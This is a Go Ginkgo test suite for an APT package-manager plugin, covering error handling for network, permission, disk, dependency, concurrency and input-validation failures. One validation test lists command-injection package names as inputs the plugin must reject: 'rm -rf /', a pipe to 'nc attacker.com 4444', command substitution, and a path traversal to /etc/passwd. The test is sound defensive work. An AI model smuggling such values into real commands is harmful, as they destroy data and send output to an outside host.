package main_test

import (
	"fmt"
	"os"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-apt"
	sdk "github.com/jameswlane/devex/packages/plugin-sdk"
)

// Mock logger to capture error messages and verify error handling quality
type MockLogger struct {
	messages []string
	errors   []string
	warnings []string
	silent   bool
}

func (m *MockLogger) Printf(format string, args ...any) {
	if !m.silent {
		m.messages = append(m.messages, fmt.Sprintf(format, args...))
	}
}

func (m *MockLogger) Println(msg string, args ...any) {
	if !m.silent {
		if len(args) > 0 {
			m.messages = append(m.messages, fmt.Sprintf(msg, args...))
		} else {
			m.messages = append(m.messages, msg)
		}
	}
}

func (m *MockLogger) Success(msg string, args ...any) {
	if !m.silent {
		m.messages = append(m.messages, fmt.Sprintf("SUCCESS: "+msg, args...))
	}
}

func (m *MockLogger) Warning(msg string, args ...any) {
	if !m.silent {
		m.warnings = append(m.warnings, fmt.Sprintf(msg, args...))
	}
}

func (m *MockLogger) ErrorMsg(msg string, args ...any) {
	if !m.silent {
		m.errors = append(m.errors, fmt.Sprintf(msg, args...))
	}
}

func (m *MockLogger) Info(msg string, keyvals ...any) {
	if !m.silent {
		m.messages = append(m.messages, "INFO: "+msg)
	}
}

func (m *MockLogger) Warn(msg string, keyvals ...any) {
	if !m.silent {
		m.warnings = append(m.warnings, "WARN: "+msg)
	}
}

func (m *MockLogger) Error(msg string, err error, keyvals ...any) {
	if !m.silent {
		if err != nil {
			m.errors = append(m.errors, fmt.Sprintf("ERROR: %s - %v", msg, err))
		} else {
			m.errors = append(m.errors, "ERROR: "+msg)
		}
	}
}

func (m *MockLogger) Debug(msg string, keyvals ...any) {
	if !m.silent {
		m.messages = append(m.messages, "DEBUG: "+msg)
	}
}

func (m *MockLogger) HasError(substring string) bool {
	for _, err := range m.errors {
		if strings.Contains(err, substring) {
			return true
		}
	}
	return false
}

func (m *MockLogger) HasWarning(substring string) bool {
	for _, warning := range m.warnings {
		if strings.Contains(warning, substring) {
			return true
		}
	}
	return false
}

func (m *MockLogger) Clear() {
	m.messages = nil
	m.errors = nil
	m.warnings = nil
}

var _ = Describe("APT Plugin Error Handling", func() {
	var (
		plugin       *main.APTInstaller
		mockLogger   *MockLogger
		originalPath string
	)

	BeforeEach(func() {
		// Save original PATH for restoration
		originalPath = os.Getenv("PATH")

		// Create plugin with mock logger
		info := sdk.PluginInfo{
			Name:        "package-manager-apt",
			Version:     "test",
			Description: "Test APT plugin for error handling",
		}

		plugin = &main.APTInstaller{
			PackageManagerPlugin: sdk.NewPackageManagerPlugin(info, "apt"),
		}

		mockLogger = &MockLogger{}
		plugin.SetLogger(mockLogger)
	})

	AfterEach(func() {
		// Restore original PATH
		_ = os.Setenv("PATH", originalPath)
		mockLogger.Clear()
	})

	Describe("Network Failure Scenarios", func() {
		Context("when network is unavailable", func() {
			It("should handle apt update failures gracefully", func() {
				// This test would require network isolation in a real environment
				// For unit tests, we simulate the scenario

				err := plugin.Execute("update", []string{})

				// Should provide actionable error message
				if err != nil {
					Expect(err.Error()).To(ContainSubstring("failed to update package lists"))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
					Expect(err.Error()).To(Not(ContainSubstring("nil pointer")))
				}
			})

			It("should handle package download failures during install", func() {
				err := plugin.Execute("install", []string{"non-existent-package-xyz123"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("not found in any repository"),
						ContainSubstring("Unable to locate package"),
						ContainSubstring("failed to install"),
					))

					// Error should be actionable
					Expect(err.Error()).To(Not(ContainSubstring("internal error")))
				}
			})
		})

		Context("when repository servers are unreachable", func() {
			It("should provide helpful error messages for repository failures", func() {
				// Test repository validation with invalid repository
				err := plugin.Execute("validate-repository", []string{"http://invalid-repo-url.example.com/ubuntu"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("repository"),
						ContainSubstring("validation"),
						ContainSubstring("unreachable"),
					))
				}
			})
		})
	})

	Describe("Permission Error Scenarios", func() {
		Context("when running without sufficient privileges", func() {
			It("should handle permission denied errors gracefully", func() {
				// Skip if running as root
				if os.Getuid() == 0 {
					Skip("Running as root - cannot test permission errors")
				}

				err := plugin.Execute("install", []string{"curl"})

				// Should either handle with sudo or provide clear error
				if err != nil {
					// Error message should be actionable
					Expect(err.Error()).To(Not(ContainSubstring("permission denied")))
					Expect(err.Error()).To(Not(BeEmpty()))
				}
			})
		})
	})

	Describe("File System Error Scenarios", func() {
		Context("when disk is full", func() {
			It("should handle disk space errors gracefully", func() {
				// This would require specific disk space testing in real environments
				// For unit tests, we verify error propagation structure

				err := plugin.Execute("install", []string{"curl"})

				// Should not panic and provide structured error
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
					Expect(err.Error()).To(Not(ContainSubstring("runtime error")))
				}
			})
		})

		Context("when package cache is corrupted", func() {
			It("should handle corrupted package database", func() {
				err := plugin.Execute("update", []string{})

				// Should handle corruption gracefully
				if err != nil {
					Expect(err.Error()).To(ContainSubstring("failed to update package lists"))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Invalid Input Handling", func() {
		Context("when provided with malformed package names", func() {
			It("should reject dangerous package name patterns", func() {
				dangerousNames := []string{
					"package; rm -rf /",
					"package && malicious-command",
					"package | nc attacker.com 4444",
					"../../../etc/passwd",
					"package$(rm -rf /)",
					"package`malicious-command`",
				}

				for _, packageName := range dangerousNames {
					err := plugin.Execute("install", []string{packageName})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("invalid package name"),
						ContainSubstring("validation failed"),
					))
				}
			})

			It("should handle empty and whitespace-only package names", func() {
				invalidNames := []string{"", " ", "\t", "\n", "   \t\n   "}

				for _, packageName := range invalidNames {
					err := plugin.Execute("install", []string{packageName})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid package name"))
				}
			})

			It("should handle excessively long package names", func() {
				longName := strings.Repeat("a", 1000)
				err := plugin.Execute("install", []string{longName})
				Expect(err).To(HaveOccurred())
			})
		})

		Context("when no packages are specified", func() {
			It("should provide clear error for missing package arguments", func() {
				err := plugin.Execute("install", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no packages specified"))

				err = plugin.Execute("remove", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no packages specified"))
			})
		})
	})

	Describe("Dependency Resolution Failures", func() {
		Context("when package dependencies cannot be resolved", func() {
			It("should provide actionable dependency error messages", func() {
				// Test with a package that might have unresolvable dependencies
				err := plugin.Execute("install", []string{"some-package-with-conflicts"})

				if err != nil {
					// Error should mention the specific issue
					Expect(err.Error()).To(Not(ContainSubstring("unknown error")))
					Expect(err.Error()).To(Not(BeEmpty()))
				}
			})
		})

		Context("when package conflicts exist", func() {
			It("should handle package conflict scenarios", func() {
				// Install command should handle conflicts gracefully
				err := plugin.Execute("install", []string{"conflicting-package"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Concurrent Operation Handling", func() {
		Context("when APT lock is held by another process", func() {
			It("should provide helpful error about APT lock", func() {
				// This would typically happen when another apt process is running
				err := plugin.Execute("install", []string{"curl"})

				// Check that we don't crash on lock conflicts
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Resource Exhaustion Scenarios", func() {
		Context("when system is under heavy load", func() {
			It("should handle timeout scenarios gracefully", func() {
				// Test command execution with potential timeouts
				err := plugin.Execute("update", []string{})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when memory is limited", func() {
			It("should not cause memory leaks during large operations", func() {
				// Test with multiple packages to ensure no memory issues
				packages := []string{"curl", "wget", "git", "vim", "nano"}
				err := plugin.Execute("install", packages)

				// Should handle large package lists without crashing
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("out of memory")))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Error Message Quality", func() {
		Context("error messages should be actionable", func() {
			It("should provide specific guidance for common errors", func() {
				err := plugin.Execute("install", []string{"non-existent-package-12345"})

				if err != nil {
					errorMsg := err.Error()

					// Should not contain technical jargon without explanation
					Expect(errorMsg).To(Not(ContainSubstring("nil pointer dereference")))
					Expect(errorMsg).To(Not(ContainSubstring("segmentation fault")))
					Expect(errorMsg).To(Not(ContainSubstring("goroutine")))

					// Should be informative
					Expect(errorMsg).To(Not(Equal("error")))
					Expect(errorMsg).To(Not(Equal("failed")))
					Expect(len(errorMsg)).To(BeNumerically(">", 10))
				}
			})

			It("should include relevant context in error messages", func() {
				err := plugin.Execute("info", []string{"non-existent-package"})

				if err != nil {
					errorMsg := err.Error()

					// Should include package name in error
					Expect(errorMsg).To(SatisfyAny(
						ContainSubstring("non-existent-package"),
						ContainSubstring("package"),
					))
				}
			})
		})
	})

	Describe("Graceful Degradation", func() {
		Context("when APT version detection fails", func() {
			It("should fallback to apt-get gracefully", func() {
				// Test behavior when version detection fails
				err := plugin.Execute("install", []string{"curl"})

				// Should not crash on version detection failures
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("version detection")))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when package availability check fails", func() {
			It("should continue installation attempt with warnings", func() {
				// Test with package availability check failures
				err := plugin.Execute("install", []string{"some-package"})

				// Should log warnings but attempt installation
				if err != nil {
					Expect(mockLogger.HasWarning("Failed to check package availability")).To(BeFalse())
					Expect(err.Error()).To(Not(ContainSubstring("availability check failed")))
				}
			})
		})
	})

	Describe("Cleanup and Recovery", func() {
		Context("when installation partially fails", func() {
			It("should not leave system in inconsistent state", func() {
				// Test partial installation failure handling
				packages := []string{"curl", "non-existent-package", "wget"}
				err := plugin.Execute("install", packages)

				// Should handle partial failures gracefully
				if err != nil {
					Expect(err.Error()).To(ContainSubstring("failed to install"))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when verification fails after installation", func() {
			It("should report verification failures clearly", func() {
				err := plugin.Execute("install", []string{"curl"})

				// Should handle verification failures without crashing
				if err != nil && strings.Contains(err.Error(), "verification failed") {
					Expect(err.Error()).To(ContainSubstring("verification failed"))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Unknown Command Handling", func() {
		Context("when executing unknown commands", func() {
			It("should return helpful error for unknown commands", func() {
				err := plugin.Execute("invalid-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
				Expect(err.Error()).To(ContainSubstring("invalid-command"))
			})
		})
	})

	Describe("Edge Cases", func() {
		Context("when system doesn't have APT", func() {
			It("should fail gracefully on non-Debian systems", func() {
				// Temporarily modify PATH to simulate missing apt
				_ = os.Setenv("PATH", "/usr/bin:/bin")

				// This should be caught by EnsureAvailable()
				// The execute method calls EnsureAvailable for most commands

				// Create a new plugin to test fresh state
				info := sdk.PluginInfo{
					Name:        "package-manager-apt",
					Version:     "test",
					Description: "Test APT plugin",
				}

				testPlugin := &main.APTInstaller{
					PackageManagerPlugin: sdk.NewPackageManagerPlugin(info, "non-existent-command"),
				}
				testPlugin.SetLogger(mockLogger)

				// This should exit with error code 1 in real usage
				// For testing, we verify the behavior doesn't panic
				defer func() {
					if r := recover(); r != nil {
						Fail(fmt.Sprintf("Plugin panicked: %v", r))
					}
				}()

				// In actual implementation, EnsureAvailable calls os.Exit(1)
				// For testing, we can only verify the logic doesn't panic
				_ = testPlugin.Execute("install", []string{"curl"})
			})
		})
	})
})

// Performance and stress testing for error conditions
var _ = Describe("APT Plugin Stress Testing", func() {
	var plugin *main.APTInstaller

	BeforeEach(func() {
		info := sdk.PluginInfo{
			Name:        "package-manager-apt",
			Version:     "test",
			Description: "Stress test APT plugin",
		}

		plugin = &main.APTInstaller{
			PackageManagerPlugin: sdk.NewPackageManagerPlugin(info, "apt"),
		}

		mockLogger := &MockLogger{silent: true} // Silent for performance tests
		plugin.SetLogger(mockLogger)
	})

	Context("handling many concurrent requests", func() {
		It("should not deadlock or crash with concurrent operations", func() {
			done := make(chan bool, 10)

			// Launch multiple concurrent operations
			for i := 0; i < 10; i++ {
				go func(index int) {
					defer GinkgoRecover()
					packageName := fmt.Sprintf("test-package-%d", index)
					err := plugin.Execute("is-installed", []string{packageName})
					// Error is expected for non-existent packages
					_ = err
					done <- true
				}(i)
			}

			// Wait for all goroutines to complete
			for i := 0; i < 10; i++ {
				Eventually(done).Should(Receive())
			}
		})
	})

	Context("handling rapid repeated operations", func() {
		It("should handle rapid fire requests without memory leaks", func() {
			for i := 0; i < 100; i++ {
				err := plugin.Execute("list", []string{"--installed"})
				// Errors are acceptable, we're testing for crashes
				_ = err
			}
		})
	})
})
